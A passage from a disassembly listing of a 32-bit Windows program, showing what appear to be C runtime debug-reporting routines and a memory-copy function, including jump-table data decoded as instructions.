  4097aa:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4097ae:	74 42                	je     0x4097f2
  4097b0:	8d 85 f8 cf ff ff    	lea    -0x3008(%ebp),%eax
  4097b6:	50                   	push   %eax
  4097b7:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4097ba:	51                   	push   %ecx
  4097bb:	8b 55 0c             	mov    0xc(%ebp),%edx
  4097be:	52                   	push   %edx
  4097bf:	68 b8 fa 40 00       	push   $0x40fab8
  4097c4:	68 00 10 00 00       	push   $0x1000
  4097c9:	8d 85 f8 df ff ff    	lea    -0x2008(%ebp),%eax
  4097cf:	50                   	push   %eax
  4097d0:	e8 cb 1e 00 00       	call   0x40b6a0
  4097d5:	83 c4 18             	add    $0x18,%esp
  4097d8:	85 c0                	test   %eax,%eax
  4097da:	7d 14                	jge    0x4097f0
  4097dc:	68 f4 fa 40 00       	push   $0x40faf4
  4097e1:	8d 8d f8 df ff ff    	lea    -0x2008(%ebp),%ecx
  4097e7:	51                   	push   %ecx
  4097e8:	e8 e3 10 00 00       	call   0x40a8d0
  4097ed:	83 c4 08             	add    $0x8,%esp
  4097f0:	eb 16                	jmp    0x409808
  4097f2:	8d 95 f8 cf ff ff    	lea    -0x3008(%ebp),%edx
  4097f8:	52                   	push   %edx
  4097f9:	8d 85 f8 df ff ff    	lea    -0x2008(%ebp),%eax
  4097ff:	50                   	push   %eax
  409800:	e8 cb 10 00 00       	call   0x40a8d0
  409805:	83 c4 08             	add    $0x8,%esp
  409808:	83 3d 28 f2 45 00 00 	cmpl   $0x0,0x45f228
  40980f:	74 3b                	je     0x40984c
  409811:	8d 8d f8 ef ff ff    	lea    -0x1008(%ebp),%ecx
  409817:	51                   	push   %ecx
  409818:	8d 95 f8 df ff ff    	lea    -0x2008(%ebp),%edx
  40981e:	52                   	push   %edx
  40981f:	8b 45 08             	mov    0x8(%ebp),%eax
  409822:	50                   	push   %eax
  409823:	ff 15 28 f2 45 00    	call   *0x45f228
  409829:	83 c4 0c             	add    $0xc,%esp
  40982c:	85 c0                	test   %eax,%eax
  40982e:	74 1c                	je     0x40984c
  409830:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  409834:	75 0b                	jne    0x409841
  409836:	68 d8 d1 45 00       	push   $0x45d1d8
  40983b:	ff 15 bc f0 40 00    	call   *0x40f0bc
  409841:	8b 85 f8 ef ff ff    	mov    -0x1008(%ebp),%eax
  409847:	e9 ff 00 00 00       	jmp    0x40994b
  40984c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40984f:	8b 14 8d dc d1 45 00 	mov    0x45d1dc(,%ecx,4),%edx
  409856:	83 e2 01             	and    $0x1,%edx
  409859:	85 d2                	test   %edx,%edx
  40985b:	74 3e                	je     0x40989b
  40985d:	8b 45 08             	mov    0x8(%ebp),%eax
  409860:	83 3c 85 e8 d1 45 00 	cmpl   $0xffffffff,0x45d1e8(,%eax,4)
  409867:	ff 
  409868:	74 31                	je     0x40989b
  40986a:	6a 00                	push   $0x0
  40986c:	8d 8d f0 cf ff ff    	lea    -0x3010(%ebp),%ecx
  409872:	51                   	push   %ecx
  409873:	8d 95 f8 df ff ff    	lea    -0x2008(%ebp),%edx
  409879:	52                   	push   %edx
  40987a:	e8 41 11 00 00       	call   0x40a9c0
  40987f:	83 c4 04             	add    $0x4,%esp
  409882:	50                   	push   %eax
  409883:	8d 85 f8 df ff ff    	lea    -0x2008(%ebp),%eax
  409889:	50                   	push   %eax
  40988a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40988d:	8b 14 8d e8 d1 45 00 	mov    0x45d1e8(,%ecx,4),%edx
  409894:	52                   	push   %edx
  409895:	ff 15 a0 f0 40 00    	call   *0x40f0a0
  40989b:	8b 45 08             	mov    0x8(%ebp),%eax
  40989e:	8b 0c 85 dc d1 45 00 	mov    0x45d1dc(,%eax,4),%ecx
  4098a5:	83 e1 02             	and    $0x2,%ecx
  4098a8:	85 c9                	test   %ecx,%ecx
  4098aa:	74 0d                	je     0x4098b9
  4098ac:	8d 95 f8 df ff ff    	lea    -0x2008(%ebp),%edx
  4098b2:	52                   	push   %edx
  4098b3:	ff 15 c0 f0 40 00    	call   *0x40f0c0
  4098b9:	8b 45 08             	mov    0x8(%ebp),%eax
  4098bc:	8b 0c 85 dc d1 45 00 	mov    0x45d1dc(,%eax,4),%ecx
  4098c3:	83 e1 04             	and    $0x4,%ecx
  4098c6:	85 c9                	test   %ecx,%ecx
  4098c8:	74 6e                	je     0x409938
  4098ca:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4098ce:	74 1d                	je     0x4098ed
  4098d0:	6a 0a                	push   $0xa
  4098d2:	8d 95 dc cf ff ff    	lea    -0x3024(%ebp),%edx
  4098d8:	52                   	push   %edx
  4098d9:	8b 45 10             	mov    0x10(%ebp),%eax
  4098dc:	50                   	push   %eax
  4098dd:	e8 9e 1c 00 00       	call   0x40b580
  4098e2:	83 c4 0c             	add    $0xc,%esp
  4098e5:	89 85 d4 cf ff ff    	mov    %eax,-0x302c(%ebp)
  4098eb:	eb 0a                	jmp    0x4098f7
  4098ed:	c7 85 d4 cf ff ff 00 	movl   $0x0,-0x302c(%ebp)
  4098f4:	00 00 00 
  4098f7:	8d 8d 00 f0 ff ff    	lea    -0x1000(%ebp),%ecx
  4098fd:	51                   	push   %ecx
  4098fe:	8b 55 14             	mov    0x14(%ebp),%edx
  409901:	52                   	push   %edx
  409902:	8b 85 d4 cf ff ff    	mov    -0x302c(%ebp),%eax
  409908:	50                   	push   %eax
  409909:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40990c:	51                   	push   %ecx
  40990d:	8b 55 08             	mov    0x8(%ebp),%edx
  409910:	52                   	push   %edx
  409911:	e8 3a 00 00 00       	call   0x409950
  409916:	83 c4 14             	add    $0x14,%esp
  409919:	89 85 f8 ef ff ff    	mov    %eax,-0x1008(%ebp)
  40991f:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  409923:	75 0b                	jne    0x409930
  409925:	68 d8 d1 45 00       	push   $0x45d1d8
  40992a:	ff 15 bc f0 40 00    	call   *0x40f0bc
  409930:	8b 85 f8 ef ff ff    	mov    -0x1008(%ebp),%eax
  409936:	eb 13                	jmp    0x40994b
  409938:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  40993c:	75 0b                	jne    0x409949
  40993e:	68 d8 d1 45 00       	push   $0x45d1d8
  409943:	ff 15 bc f0 40 00    	call   *0x40f0bc
  409949:	33 c0                	xor    %eax,%eax
  40994b:	5f                   	pop    %edi
  40994c:	8b e5                	mov    %ebp,%esp
  40994e:	5d                   	pop    %ebp
  40994f:	c3                   	ret
  409950:	55                   	push   %ebp
  409951:	8b ec                	mov    %esp,%ebp
  409953:	b8 38 11 00 00       	mov    $0x1138,%eax
  409958:	e8 d3 15 00 00       	call   0x40af30
  40995d:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
  409961:	75 25                	jne    0x409988
  409963:	68 94 fc 40 00       	push   $0x40fc94
  409968:	6a 00                	push   $0x0
  40996a:	68 da 01 00 00       	push   $0x1da
  40996f:	68 88 fc 40 00       	push   $0x40fc88
  409974:	6a 02                	push   $0x2
  409976:	e8 45 fc ff ff       	call   0x4095c0
  40997b:	83 c4 14             	add    $0x14,%esp
  40997e:	83 f8 01             	cmp    $0x1,%eax
  409981:	75 05                	jne    0x409988
  409983:	e8 28 fc ff ff       	call   0x4095b0
  409988:	33 c0                	xor    %eax,%eax
  40998a:	85 c0                	test   %eax,%eax
  40998c:	75 cf                	jne    0x40995d
  40998e:	68 04 01 00 00       	push   $0x104
  409993:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  409999:	51                   	push   %ecx
  40999a:	6a 00                	push   $0x0
  40999c:	ff 15 6c f0 40 00    	call   *0x40f06c
  4099a2:	85 c0                	test   %eax,%eax
  4099a4:	75 14                	jne    0x4099ba
  4099a6:	68 44 f5 40 00       	push   $0x40f544
  4099ab:	8d 95 f8 fe ff ff    	lea    -0x108(%ebp),%edx
  4099b1:	52                   	push   %edx
  4099b2:	e8 19 0f 00 00       	call   0x40a8d0
  4099b7:	83 c4 08             	add    $0x8,%esp
  4099ba:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  4099c0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4099c3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4099c6:	51                   	push   %ecx
  4099c7:	e8 f4 0f 00 00       	call   0x40a9c0
  4099cc:	83 c4 04             	add    $0x4,%esp
  4099cf:	83 f8 40             	cmp    $0x40,%eax
  4099d2:	76 29                	jbe    0x4099fd
  4099d4:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4099d7:	52                   	push   %edx
  4099d8:	e8 e3 0f 00 00       	call   0x40a9c0
  4099dd:	83 c4 04             	add    $0x4,%esp
  4099e0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4099e3:	8d 54 01 c0          	lea    -0x40(%ecx,%eax,1),%edx
  4099e7:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4099ea:	6a 03                	push   $0x3
  4099ec:	68 40 f5 40 00       	push   $0x40f540
  4099f1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4099f4:	50                   	push   %eax
  4099f5:	e8 26 16 00 00       	call   0x40b020
  4099fa:	83 c4 0c             	add    $0xc,%esp
  4099fd:	8b 4d 14             	mov    0x14(%ebp),%ecx
  409a00:	89 8d f0 ee ff ff    	mov    %ecx,-0x1110(%ebp)
  409a06:	83 bd f0 ee ff ff 00 	cmpl   $0x0,-0x1110(%ebp)
  409a0d:	74 49                	je     0x409a58
  409a0f:	8b 95 f0 ee ff ff    	mov    -0x1110(%ebp),%edx
  409a15:	52                   	push   %edx
  409a16:	e8 a5 0f 00 00       	call   0x40a9c0
  409a1b:	83 c4 04             	add    $0x4,%esp
  409a1e:	83 f8 40             	cmp    $0x40,%eax
  409a21:	76 35                	jbe    0x409a58
  409a23:	8b 85 f0 ee ff ff    	mov    -0x1110(%ebp),%eax
  409a29:	50                   	push   %eax
  409a2a:	e8 91 0f 00 00       	call   0x40a9c0
  409a2f:	83 c4 04             	add    $0x4,%esp
  409a32:	8b 8d f0 ee ff ff    	mov    -0x1110(%ebp),%ecx
  409a38:	8d 54 01 c0          	lea    -0x40(%ecx,%eax,1),%edx
  409a3c:	89 95 f0 ee ff ff    	mov    %edx,-0x1110(%ebp)
  409a42:	6a 03                	push   $0x3
  409a44:	68 40 f5 40 00       	push   $0x40f540
  409a49:	8b 85 f0 ee ff ff    	mov    -0x1110(%ebp),%eax
  409a4f:	50                   	push   %eax
  409a50:	e8 cb 15 00 00       	call   0x40b020
  409a55:	83 c4 0c             	add    $0xc,%esp
  409a58:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  409a5c:	75 0c                	jne    0x409a6a
  409a5e:	c7 85 ec ee ff ff 14 	movl   $0x40fc14,-0x1114(%ebp)
  409a65:	fc 40 00 
  409a68:	eb 0a                	jmp    0x409a74
  409a6a:	c7 85 ec ee ff ff 10 	movl   $0x40fc10,-0x1114(%ebp)
  409a71:	fc 40 00 
  409a74:	8b 4d 18             	mov    0x18(%ebp),%ecx
  409a77:	0f be 11             	movsbl (%ecx),%edx
  409a7a:	85 d2                	test   %edx,%edx
  409a7c:	74 0b                	je     0x409a89
  409a7e:	8b 45 18             	mov    0x18(%ebp),%eax
  409a81:	89 85 e8 ee ff ff    	mov    %eax,-0x1118(%ebp)
  409a87:	eb 0a                	jmp    0x409a93
  409a89:	c7 85 e8 ee ff ff 10 	movl   $0x40fc10,-0x1118(%ebp)
  409a90:	fc 40 00 
  409a93:	8b 4d 18             	mov    0x18(%ebp),%ecx
  409a96:	0f be 11             	movsbl (%ecx),%edx
  409a99:	85 d2                	test   %edx,%edx
  409a9b:	74 12                	je     0x409aaf
  409a9d:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  409aa1:	75 0c                	jne    0x409aaf
  409aa3:	c7 85 e4 ee ff ff 00 	movl   $0x40fc00,-0x111c(%ebp)
  409aaa:	fc 40 00 
  409aad:	eb 0a                	jmp    0x409ab9
  409aaf:	c7 85 e4 ee ff ff 10 	movl   $0x40fc10,-0x111c(%ebp)
  409ab6:	fc 40 00 
  409ab9:	8b 45 18             	mov    0x18(%ebp),%eax
  409abc:	0f be 08             	movsbl (%eax),%ecx
  409abf:	85 c9                	test   %ecx,%ecx
  409ac1:	74 0c                	je     0x409acf
  409ac3:	c7 85 e0 ee ff ff 20 	movl   $0x40f520,-0x1120(%ebp)
  409aca:	f5 40 00 
  409acd:	eb 0a                	jmp    0x409ad9
  409acf:	c7 85 e0 ee ff ff 10 	movl   $0x40fc10,-0x1120(%ebp)
  409ad6:	fc 40 00 
  409ad9:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  409add:	74 0b                	je     0x409aea
  409adf:	8b 55 10             	mov    0x10(%ebp),%edx
  409ae2:	89 95 dc ee ff ff    	mov    %edx,-0x1124(%ebp)
  409ae8:	eb 0a                	jmp    0x409af4
  409aea:	c7 85 dc ee ff ff 10 	movl   $0x40fc10,-0x1124(%ebp)
  409af1:	fc 40 00 
  409af4:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  409af8:	74 0c                	je     0x409b06
  409afa:	c7 85 d8 ee ff ff f8 	movl   $0x40fbf8,-0x1128(%ebp)
  409b01:	fb 40 00 
  409b04:	eb 0a                	jmp    0x409b10
  409b06:	c7 85 d8 ee ff ff 10 	movl   $0x40fc10,-0x1128(%ebp)
  409b0d:	fc 40 00 
  409b10:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  409b14:	74 0b                	je     0x409b21
  409b16:	8b 45 0c             	mov    0xc(%ebp),%eax
  409b19:	89 85 d4 ee ff ff    	mov    %eax,-0x112c(%ebp)
  409b1f:	eb 0a                	jmp    0x409b2b
  409b21:	c7 85 d4 ee ff ff 10 	movl   $0x40fc10,-0x112c(%ebp)
  409b28:	fc 40 00 
  409b2b:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  409b2f:	74 0c                	je     0x409b3d
  409b31:	c7 85 d0 ee ff ff f0 	movl   $0x40fbf0,-0x1130(%ebp)
  409b38:	fb 40 00 
  409b3b:	eb 0a                	jmp    0x409b47
  409b3d:	c7 85 d0 ee ff ff 10 	movl   $0x40fc10,-0x1130(%ebp)
  409b44:	fc 40 00 
  409b47:	83 bd f0 ee ff ff 00 	cmpl   $0x0,-0x1110(%ebp)
  409b4e:	74 0e                	je     0x409b5e
  409b50:	8b 8d f0 ee ff ff    	mov    -0x1110(%ebp),%ecx
  409b56:	89 8d cc ee ff ff    	mov    %ecx,-0x1134(%ebp)
  409b5c:	eb 0a                	jmp    0x409b68
  409b5e:	c7 85 cc ee ff ff 10 	movl   $0x40fc10,-0x1134(%ebp)
  409b65:	fc 40 00 
  409b68:	83 bd f0 ee ff ff 00 	cmpl   $0x0,-0x1110(%ebp)
  409b6f:	74 0c                	je     0x409b7d
  409b71:	c7 85 c8 ee ff ff e4 	movl   $0x40fbe4,-0x1138(%ebp)
  409b78:	fb 40 00 
  409b7b:	eb 0a                	jmp    0x409b87
  409b7d:	c7 85 c8 ee ff ff 10 	movl   $0x40fc10,-0x1138(%ebp)
  409b84:	fc 40 00 
  409b87:	8b 95 ec ee ff ff    	mov    -0x1114(%ebp),%edx
  409b8d:	52                   	push   %edx
  409b8e:	8b 85 e8 ee ff ff    	mov    -0x1118(%ebp),%eax
  409b94:	50                   	push   %eax
  409b95:	8b 8d e4 ee ff ff    	mov    -0x111c(%ebp),%ecx
  409b9b:	51                   	push   %ecx
  409b9c:	8b 95 e0 ee ff ff    	mov    -0x1120(%ebp),%edx
  409ba2:	52                   	push   %edx
  409ba3:	8b 85 dc ee ff ff    	mov    -0x1124(%ebp),%eax
  409ba9:	50                   	push   %eax
  409baa:	8b 8d d8 ee ff ff    	mov    -0x1128(%ebp),%ecx
  409bb0:	51                   	push   %ecx
  409bb1:	8b 95 d4 ee ff ff    	mov    -0x112c(%ebp),%edx
  409bb7:	52                   	push   %edx
  409bb8:	8b 85 d0 ee ff ff    	mov    -0x1130(%ebp),%eax
  409bbe:	50                   	push   %eax
  409bbf:	8b 8d cc ee ff ff    	mov    -0x1134(%ebp),%ecx
  409bc5:	51                   	push   %ecx
  409bc6:	8b 95 c8 ee ff ff    	mov    -0x1138(%ebp),%edx
  409bcc:	52                   	push   %edx
  409bcd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409bd0:	50                   	push   %eax
  409bd1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409bd4:	8b 14 8d f4 d1 45 00 	mov    0x45d1f4(,%ecx,4),%edx
  409bdb:	52                   	push   %edx
  409bdc:	68 90 fb 40 00       	push   $0x40fb90
  409be1:	68 00 10 00 00       	push   $0x1000
  409be6:	8d 85 f4 ee ff ff    	lea    -0x110c(%ebp),%eax
  409bec:	50                   	push   %eax
  409bed:	e8 ae 1a 00 00       	call   0x40b6a0
  409bf2:	83 c4 3c             	add    $0x3c,%esp
  409bf5:	85 c0                	test   %eax,%eax
  409bf7:	7d 14                	jge    0x409c0d
  409bf9:	68 f4 fa 40 00       	push   $0x40faf4
  409bfe:	8d 8d f4 ee ff ff    	lea    -0x110c(%ebp),%ecx
  409c04:	51                   	push   %ecx
  409c05:	e8 c6 0c 00 00       	call   0x40a8d0
  409c0a:	83 c4 08             	add    $0x8,%esp
  409c0d:	68 12 20 01 00       	push   $0x12012
  409c12:	68 6c fb 40 00       	push   $0x40fb6c
  409c17:	8d 95 f4 ee ff ff    	lea    -0x110c(%ebp),%edx
  409c1d:	52                   	push   %edx
  409c1e:	e8 3d 13 00 00       	call   0x40af60
  409c23:	83 c4 0c             	add    $0xc,%esp
  409c26:	89 85 f4 fe ff ff    	mov    %eax,-0x10c(%ebp)
  409c2c:	83 bd f4 fe ff ff 03 	cmpl   $0x3,-0x10c(%ebp)
  409c33:	75 11                	jne    0x409c46
  409c35:	6a 16                	push   $0x16
  409c37:	e8 64 1c 00 00       	call   0x40b8a0
  409c3c:	83 c4 04             	add    $0x4,%esp
  409c3f:	6a 03                	push   $0x3
  409c41:	e8 9a ab ff ff       	call   0x4047e0
  409c46:	83 bd f4 fe ff ff 04 	cmpl   $0x4,-0x10c(%ebp)
  409c4d:	75 07                	jne    0x409c56
  409c4f:	b8 01 00 00 00       	mov    $0x1,%eax
  409c54:	eb 02                	jmp    0x409c58
  409c56:	33 c0                	xor    %eax,%eax
  409c58:	8b e5                	mov    %ebp,%esp
  409c5a:	5d                   	pop    %ebp
  409c5b:	c3                   	ret
  409c5c:	cc                   	int3
  409c5d:	cc                   	int3
  409c5e:	cc                   	int3
  409c5f:	cc                   	int3
  409c60:	55                   	push   %ebp
  409c61:	8b ec                	mov    %esp,%ebp
  409c63:	51                   	push   %ecx
  409c64:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  409c6b:	8b 45 0c             	mov    0xc(%ebp),%eax
  409c6e:	50                   	push   %eax
  409c6f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409c72:	51                   	push   %ecx
  409c73:	ff 15 a8 f0 40 00    	call   *0x40f0a8
  409c79:	85 c0                	test   %eax,%eax
  409c7b:	74 07                	je     0x409c84
  409c7d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  409c84:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409c87:	8b e5                	mov    %ebp,%esp
  409c89:	5d                   	pop    %ebp
  409c8a:	c3                   	ret
  409c8b:	cc                   	int3
  409c8c:	cc                   	int3
  409c8d:	cc                   	int3
  409c8e:	cc                   	int3
  409c8f:	cc                   	int3
  409c90:	55                   	push   %ebp
  409c91:	8b ec                	mov    %esp,%ebp
  409c93:	51                   	push   %ecx
  409c94:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  409c9b:	8b 45 0c             	mov    0xc(%ebp),%eax
  409c9e:	50                   	push   %eax
  409c9f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409ca2:	51                   	push   %ecx
  409ca3:	ff 15 a4 f0 40 00    	call   *0x40f0a4
  409ca9:	85 c0                	test   %eax,%eax
  409cab:	74 07                	je     0x409cb4
  409cad:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  409cb4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409cb7:	8b e5                	mov    %ebp,%esp
  409cb9:	5d                   	pop    %ebp
  409cba:	c3                   	ret
  409cbb:	cc                   	int3
  409cbc:	cc                   	int3
  409cbd:	cc                   	int3
  409cbe:	cc                   	int3
  409cbf:	cc                   	int3
  409cc0:	55                   	push   %ebp
  409cc1:	8b ec                	mov    %esp,%ebp
  409cc3:	51                   	push   %ecx
  409cc4:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  409ccb:	8b 45 08             	mov    0x8(%ebp),%eax
  409cce:	50                   	push   %eax
  409ccf:	ff 15 c8 f0 40 00    	call   *0x40f0c8
  409cd5:	85 c0                	test   %eax,%eax
  409cd7:	74 07                	je     0x409ce0
  409cd9:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  409ce0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409ce3:	8b e5                	mov    %ebp,%esp
  409ce5:	5d                   	pop    %ebp
  409ce6:	c3                   	ret
  409ce7:	cc                   	int3
  409ce8:	cc                   	int3
  409ce9:	cc                   	int3
  409cea:	cc                   	int3
  409ceb:	cc                   	int3
  409cec:	cc                   	int3
  409ced:	cc                   	int3
  409cee:	cc                   	int3
  409cef:	cc                   	int3
  409cf0:	55                   	push   %ebp
  409cf1:	8b ec                	mov    %esp,%ebp
  409cf3:	57                   	push   %edi
  409cf4:	56                   	push   %esi
  409cf5:	8b 75 0c             	mov    0xc(%ebp),%esi
  409cf8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  409cfb:	8b 7d 08             	mov    0x8(%ebp),%edi
  409cfe:	8b c1                	mov    %ecx,%eax
  409d00:	8b d1                	mov    %ecx,%edx
  409d02:	03 c6                	add    %esi,%eax
  409d04:	3b fe                	cmp    %esi,%edi
  409d06:	76 08                	jbe    0x409d10
  409d08:	3b f8                	cmp    %eax,%edi
  409d0a:	0f 82 78 01 00 00    	jb     0x409e88
  409d10:	f7 c7 03 00 00 00    	test   $0x3,%edi
  409d16:	75 14                	jne    0x409d2c
  409d18:	c1 e9 02             	shr    $0x2,%ecx
  409d1b:	83 e2 03             	and    $0x3,%edx
  409d1e:	83 f9 08             	cmp    $0x8,%ecx
  409d21:	72 29                	jb     0x409d4c
  409d23:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  409d25:	ff 24 95 38 9e 40 00 	jmp    *0x409e38(,%edx,4)
  409d2c:	8b c7                	mov    %edi,%eax
  409d2e:	ba 03 00 00 00       	mov    $0x3,%edx
  409d33:	83 e9 04             	sub    $0x4,%ecx
  409d36:	72 0c                	jb     0x409d44
  409d38:	83 e0 03             	and    $0x3,%eax
  409d3b:	03 c8                	add    %eax,%ecx
  409d3d:	ff 24 85 50 9d 40 00 	jmp    *0x409d50(,%eax,4)
  409d44:	ff 24 8d 48 9e 40 00 	jmp    *0x409e48(,%ecx,4)
  409d4b:	90                   	nop
  409d4c:	ff 24 8d cc 9d 40 00 	jmp    *0x409dcc(,%ecx,4)
  409d53:	90                   	nop
  409d54:	60                   	pusha
  409d55:	9d                   	popf
  409d56:	40                   	inc    %eax
  409d57:	00 8c 9d 40 00 b0 9d 	add    %cl,-0x624fffc0(%ebp,%ebx,4)
  409d5e:	40                   	inc    %eax
  409d5f:	00 23                	add    %ah,(%ebx)
  409d61:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  409d67:	46                   	inc    %esi
  409d68:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  409d6e:	02 c1                	add    %cl,%al
  409d70:	e9 02 88 47 02       	jmp    0x2882577
  409d75:	83 c6 03             	add    $0x3,%esi
  409d78:	83 c7 03             	add    $0x3,%edi
  409d7b:	83 f9 08             	cmp    $0x8,%ecx
  409d7e:	72 cc                	jb     0x409d4c
  409d80:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  409d82:	ff 24 95 38 9e 40 00 	jmp    *0x409e38(,%edx,4)
  409d89:	8d 49 00             	lea    0x0(%ecx),%ecx
  409d8c:	23 d1                	and    %ecx,%edx
  409d8e:	8a 06                	mov    (%esi),%al
  409d90:	88 07                	mov    %al,(%edi)
  409d92:	8a 46 01             	mov    0x1(%esi),%al
  409d95:	c1 e9 02             	shr    $0x2,%ecx
  409d98:	88 47 01             	mov    %al,0x1(%edi)
  409d9b:	83 c6 02             	add    $0x2,%esi
  409d9e:	83 c7 02             	add    $0x2,%edi
  409da1:	83 f9 08             	cmp    $0x8,%ecx
  409da4:	72 a6                	jb     0x409d4c
  409da6:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  409da8:	ff 24 95 38 9e 40 00 	jmp    *0x409e38(,%edx,4)
  409daf:	90                   	nop
  409db0:	23 d1                	and    %ecx,%edx
  409db2:	8a 06                	mov    (%esi),%al
  409db4:	88 07                	mov    %al,(%edi)
  409db6:	46                   	inc    %esi
  409db7:	c1 e9 02             	shr    $0x2,%ecx
  409dba:	47                   	inc    %edi
  409dbb:	83 f9 08             	cmp    $0x8,%ecx
  409dbe:	72 8c                	jb     0x409d4c
  409dc0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  409dc2:	ff 24 95 38 9e 40 00 	jmp    *0x409e38(,%edx,4)
  409dc9:	8d 49 00             	lea    0x0(%ecx),%ecx
  409dcc:	2f                   	das
  409dcd:	9e                   	sahf
  409dce:	40                   	inc    %eax
  409dcf:	00 1c 9e             	add    %bl,(%esi,%ebx,4)
  409dd2:	40                   	inc    %eax
  409dd3:	00 14 9e             	add    %dl,(%esi,%ebx,4)
  409dd6:	40                   	inc    %eax
  409dd7:	00 0c 9e             	add    %cl,(%esi,%ebx,4)
  409dda:	40                   	inc    %eax
  409ddb:	00 04 9e             	add    %al,(%esi,%ebx,4)
  409dde:	40                   	inc    %eax
  409ddf:	00 fc                	add    %bh,%ah
  409de1:	9d                   	popf
  409de2:	40                   	inc    %eax
  409de3:	00 f4                	add    %dh,%ah
  409de5:	9d                   	popf
  409de6:	40                   	inc    %eax
  409de7:	00 ec                	add    %ch,%ah
  409de9:	9d                   	popf
  409dea:	40                   	inc    %eax
  409deb:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  409df1:	44                   	inc    %esp
  409df2:	8f                   	(bad)
  409df3:	e4 8b                	in     $0x8b,%al
  409df5:	44                   	inc    %esp
  409df6:	8e e8                	mov    %eax,%gs
  409df8:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  409dfc:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  409e00:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  409e04:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  409e08:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  409e0c:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  409e10:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  409e14:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  409e18:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  409e1c:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  409e20:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  409e24:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  409e2b:	03 f0                	add    %eax,%esi
  409e2d:	03 f8                	add    %eax,%edi
  409e2f:	ff 24 95 38 9e 40 00 	jmp    *0x409e38(,%edx,4)
  409e36:	8b ff                	mov    %edi,%edi
  409e38:	48                   	dec    %eax
  409e39:	9e                   	sahf
  409e3a:	40                   	inc    %eax
  409e3b:	00 50 9e             	add    %dl,-0x62(%eax)
  409e3e:	40                   	inc    %eax
  409e3f:	00 5c 9e 40          	add    %bl,0x40(%esi,%ebx,4)
  409e43:	00 70 9e             	add    %dh,-0x62(%eax)
  409e46:	40                   	inc    %eax
  409e47:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  409e4d:	c9                   	leave
  409e4e:	c3                   	ret
  409e4f:	90                   	nop
  409e50:	8a 06                	mov    (%esi),%al
  409e52:	88 07                	mov    %al,(%edi)
  409e54:	8b 45 08             	mov    0x8(%ebp),%eax
  409e57:	5e                   	pop    %esi
  409e58:	5f                   	pop    %edi
  409e59:	c9                   	leave
  409e5a:	c3                   	ret
  409e5b:	90                   	nop
  409e5c:	8a 06                	mov    (%esi),%al
  409e5e:	88 07                	mov    %al,(%edi)
  409e60:	8a 46 01             	mov    0x1(%esi),%al
  409e63:	88 47 01             	mov    %al,0x1(%edi)
  409e66:	8b 45 08             	mov    0x8(%ebp),%eax
  409e69:	5e                   	pop    %esi
  409e6a:	5f                   	pop    %edi
  409e6b:	c9                   	leave
  409e6c:	c3                   	ret
  409e6d:	8d 49 00             	lea    0x0(%ecx),%ecx
  409e70:	8a 06                	mov    (%esi),%al
  409e72:	88 07                	mov    %al,(%edi)
  409e74:	8a 46 01             	mov    0x1(%esi),%al
  409e77:	88 47 01             	mov    %al,0x1(%edi)
  409e7a:	8a 46 02             	mov    0x2(%esi),%al
  409e7d:	88 47 02             	mov    %al,0x2(%edi)
  409e80:	8b 45 08             	mov    0x8(%ebp),%eax
  409e83:	5e                   	pop    %esi
